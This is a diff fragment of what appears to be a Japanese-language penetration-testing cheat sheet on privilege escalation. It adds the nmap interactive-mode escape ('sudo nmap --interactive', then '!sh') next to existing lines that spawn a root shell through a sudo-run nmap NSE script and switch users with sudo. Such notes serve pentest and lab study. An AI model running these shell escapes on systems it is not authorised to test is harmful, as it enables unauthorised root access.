@@ -21,6 +21,8 @@ reset; bash 1>&0 2>&0
   os.execute("/bin/bash")
   ```
   `sudo nmap --script ./shell.nse localhost`
+- `sudo nmap --interactive`  
+  `nmap> !sh`
 ## 権限変更
 `sudo -u scriptmanager bash`
 ## 検索用
